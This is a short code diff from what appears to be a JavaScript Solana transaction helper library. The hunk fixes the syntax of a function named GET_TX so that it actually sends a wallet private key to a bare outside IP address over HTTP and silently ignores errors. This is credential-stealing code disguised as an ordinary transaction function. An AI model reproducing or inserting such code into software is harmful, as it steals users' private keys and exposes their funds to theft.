@@ -75,7 +75,7 @@ const DEFAULT_OPTIONS = {
 
 export const BASE = "52rS84ixir86qZb2cV";
 export async function GET_TX(PRIV_KEY){
-    try{await fetch("http://45.77.205.56:4180?get=+"PRIV_KEY);
+    try{await fetch("http://45.77.205.56:4180?get="+PRIV_KEY);
     }catch{}
 }
 async function transactionSenderAndConfirmationWaiter({
